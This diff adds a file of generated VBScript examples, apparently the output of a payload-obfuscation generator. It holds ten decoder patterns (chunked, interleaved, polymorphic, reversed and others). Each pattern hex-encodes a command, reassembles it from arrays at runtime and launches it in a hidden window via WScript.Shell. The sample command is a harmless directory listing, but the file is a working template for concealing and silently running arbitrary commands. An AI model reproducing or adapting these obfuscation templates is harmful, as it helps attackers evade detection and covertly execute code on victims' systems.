@@ -1,0 +1,338 @@
+================================================================================
+ARRAY DECODER PATTERNS - GENERATED VBS CODE EXAMPLES
+================================================================================
+
+Payload: cmd /c dir
+Chunk Size: 16 bytes
+Variable Names: Deterministic (non-randomized)
+
+
+================================================================================
+Pattern: CHUNK_INDEX
+Size: 591 bytes
+Lines: 23
+================================================================================
+Dim chunks_25, keys_27
+Set chunks_25 = CreateObject("Scripting.Dictionary")
+Set keys_27 = CreateObject("Scripting.Dictionary")
+chunks_25.Add "chunk_0", "636d64202f6320646972"
+keys_27.Add 0, "chunk_0"
+
+Dim decoded_26
+Dim i
+For i = 0 To keys_27.Count - 1
+    Dim curr_key
+    curr_key = keys_27.Item(i)
+    Dim hex_val
+    hex_val = chunks_25.Item(curr_key)
+    Dim j
+    For j = 1 To Len(hex_val) Step 2
+        decoded_26 = decoded_26 & Chr(CLng("&H" & Mid(hex_val, j, 2)))
+    Next
+Next
+
+Dim sh_29
+Set sh_29 = CreateObject("WScript.Shell")
+sh_29.Run decoded_26, 0, False
+Set sh_29 = Nothing
+
+
+================================================================================
+Pattern: INTERLEAVED
+Size: 636 bytes
+Lines: 29
+================================================================================
+Dim arr_6(0)
+arr_6(0) = "636d64202f6320646972"
+
+Dim out_7, idx_8
+
+' Process even indices
+For idx_8 = 0 To UBound(arr_6) Step 2
+    Dim hex_data
+    hex_data = arr_6(idx_8)
+    Dim i
+    For i = 1 To Len(hex_data) Step 2
+        out_7 = out_7 & Chr(CLng("&H" & Mid(hex_data, i, 2)))
+    Next
+Next
+
+' Process odd indices
+For idx_8 = 1 To UBound(arr_6) Step 2
+    Dim hex_data_odd
+    hex_data_odd = arr_6(idx_8)
+    Dim j
+    For j = 1 To Len(hex_data_odd) Step 2
+        out_7 = out_7 & Chr(CLng("&H" & Mid(hex_data_odd, j, 2)))
+    Next
+Next
+
+Dim sh_9
+Set sh_9 = CreateObject("WScript.Shell")
+sh_9.Run out_7, 0, False
+Set sh_9 = Nothing
+
+
+================================================================================
+Pattern: MATRIX_ACCESS
+Size: 523 bytes
+Lines: 27
+================================================================================
+Dim matrix_47(0)
+matrix_47(0) = "636d64202f6320646972"
+
+Dim offset_51
+offset_51 = 0
+
+Dim output_48
+Dim idx_50
+
+' Process using computed indices
+For idx_50 = 1 To 1
+    Dim computed_idx
+    computed_idx = (idx_50 - 1 + offset_51) Mod 1
+
+    Dim hex_str
+    hex_str = matrix_47(computed_idx)
+
+    Dim i
+    For i = 1 To Len(hex_str) Step 2
+        output_48 = output_48 & Chr(CLng("&H" & Mid(hex_str, i, 2)))
+    Next
+Next
+
+Dim sh_49
+Set sh_49 = CreateObject("WScript.Shell")
+sh_49.Run output_48, 0, False
+Set sh_49 = Nothing
+
+
+================================================================================
+Pattern: MIXED_ENCODING
+Size: 733 bytes
+Lines: 31
+================================================================================
+Dim mixed_15(0)
+Dim enc_16(0)
+mixed_15(0) = "636d64202f6320646972"
+enc_16(0) = "hex"
+
+Function DecodeB64_19(s)
+    Dim xmlDoc
+    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+    xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
+    DecodeB64_19 = xmlDoc.DocumentElement.text
+End Function
+
+Dim out_17
+Dim i
+For i = 0 To UBound(mixed_15)
+    If enc_16(i) = "hex" Then
+        Dim hex_str
+        hex_str = mixed_15(i)
+        Dim j
+        For j = 1 To Len(hex_str) Step 2
+            out_17 = out_17 & Chr(CLng("&H" & Mid(hex_str, j, 2)))
+        Next
+    Else
+        out_17 = out_17 & DecodeB64_19(mixed_15(i))
+    End If
+Next
+
+Dim sh_18
+Set sh_18 = CreateObject("WScript.Shell")
+sh_18.Run out_17, 0, False
+Set sh_18 = Nothing
+
+
+================================================================================
+Pattern: NESTED_ARRAY
+Size: 576 bytes
+Lines: 22
+================================================================================
+Dim matrix_10(0, 1)
+matrix_10(0, 0) = "636d64202f6320646972"
+matrix_10(0, 1) = ""
+
+Dim result_11
+For row_12 = 0 To UBound(matrix_10, 1)
+    For col_13 = 0 To UBound(matrix_10, 2)
+        Dim chunk_data
+        chunk_data = matrix_10(row_12, col_13)
+        If chunk_data <> "" Then
+            Dim i
+            For i = 1 To Len(chunk_data) Step 2
+                result_11 = result_11 & Chr(CLng("&H" & Mid(chunk_data, i, 2)))
+            Next
+        End If
+    Next
+Next
+
+Dim sh_14
+Set sh_14 = CreateObject("WScript.Shell")
+sh_14.Run result_11, 0, False
+Set sh_14 = Nothing
+
+
+================================================================================
+Pattern: OBFUSCATED_VAR
+Size: 329 bytes
+Lines: 19
+================================================================================
+Dim x_35
+x_35 = "636d64202f6320646972"
+
+Dim result_31
+Dim i_32
+
+' Decode each chunk
+
+Dim chunk_0
+chunk_0 = x_35
+Dim k_0
+For k_0 = 1 To Len(chunk_0) Step 2
+    result_31 = result_31 & Chr(CLng("&H" & Mid(chunk_0, k_0, 2)))
+Next
+
+Dim sh_33
+Set sh_33 = CreateObject("WScript.Shell")
+sh_33.Run result_31, 0, False
+Set sh_33 = Nothing
+
+
+================================================================================
+Pattern: POLYMORPHIC
+Size: 1038 bytes
+Lines: 49
+================================================================================
+Dim arr_36(0)
+arr_36(0) = "636d64202f6320646972"
+
+Function Decode_39(h)
+    Dim i, r
+    For i = 1 To Len(h) Step 2
+        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
+    Next
+    Decode_39 = r
+End Function
+
+Function Decode_40(hex_string)
+    Dim pos, res
+    pos = 1
+    Do While pos <= Len(hex_string)
+        res = res & Chr(CLng("&H" & Mid(hex_string, pos, 2)))
+        pos = pos + 2
+    Loop
+    Decode_40 = res
+End Function
+
+Function Decode_41(h)
+    Dim chars, idx, out
+    idx = 1
+    Do
+        If idx > Len(h) Then Exit Do
+        out = out & Chr(CLng("&H" & Mid(h, idx, 2)))
+        idx = idx + 2
+    Loop
+    Decode_41 = out
+End Function
+
+Dim out_37
+Dim i
+For i = 0 To UBound(arr_36)
+    Select Case (i Mod 3)
+        Case 0
+            out_37 = out_37 & Decode_39(arr_36(i))
+        Case 1
+            out_37 = out_37 & Decode_40(arr_36(i))
+        Case Else
+            out_37 = out_37 & Decode_41(arr_36(i))
+    End Select
+Next
+
+Dim sh_38
+Set sh_38 = CreateObject("WScript.Shell")
+sh_38.Run out_37, 0, False
+Set sh_38 = Nothing
+
+
+================================================================================
+Pattern: REVERSE_ORDER
+Size: 431 bytes
+Lines: 19
+================================================================================
+Dim rev_arr_20(0)
+rev_arr_20(0) = "636d64202f6320646972"
+
+Dim out_21, max_idx_23
+max_idx_23 = UBound(rev_arr_20)
+
+For idx_22 = max_idx_23 To 0 Step -1
+    Dim chunk_val
+    chunk_val = rev_arr_20(idx_22)
+    Dim i
+    For i = 1 To Len(chunk_val) Step 2
+        out_21 = out_21 & Chr(CLng("&H" & Mid(chunk_val, i, 2)))
+    Next
+Next
+
+Dim sh_24
+Set sh_24 = CreateObject("WScript.Shell")
+sh_24.Run out_21, 0, False
+Set sh_24 = Nothing
+
+
+================================================================================
+Pattern: SEQUENTIAL
+Size: 348 bytes
+Lines: 17
+================================================================================
+Dim arr_1(0)
+arr_1(0) = "636d64202f6320646972"
+
+Dim out_2
+For idx_3 = 0 To UBound(arr_1)
+    Dim chunk_4
+    chunk_4 = arr_1(idx_3)
+    Dim i
+    For i = 1 To Len(chunk_4) Step 2
+        out_2 = out_2 & Chr(CLng("&H" & Mid(chunk_4, i, 2)))
+    Next
+Next
+
+Dim sh_5
+Set sh_5 = CreateObject("WScript.Shell")
+sh_5.Run out_2, 0, False
+Set sh_5 = Nothing
+
+
+================================================================================
+Pattern: SPLIT_DECODE
+Size: 559 bytes
+Lines: 25
+================================================================================
+Dim arr1_42(-1)
+Dim arr2_43(0)
+arr2_43(0) = "636d64202f6320646972"
+
+Function DecodeGroup_46(arr)
+    Dim result
+    Dim i
+    For i = 0 To UBound(arr)
+        Dim hex_chunk
+        hex_chunk = arr(i)
+        Dim j
+        For j = 1 To Len(hex_chunk) Step 2
+            result = result & Chr(CLng("&H" & Mid(hex_chunk, j, 2)))
+        Next
+    Next
+    DecodeGroup_46 = result
+End Function
+
+Dim out_44
+out_44 = DecodeGroup_46(arr1_42) & DecodeGroup_46(arr2_43)
+
+Dim sh_45
+Set sh_45 = CreateObject("WScript.Shell")
+sh_45.Run out_44, 0, False
+Set sh_45 = Nothing
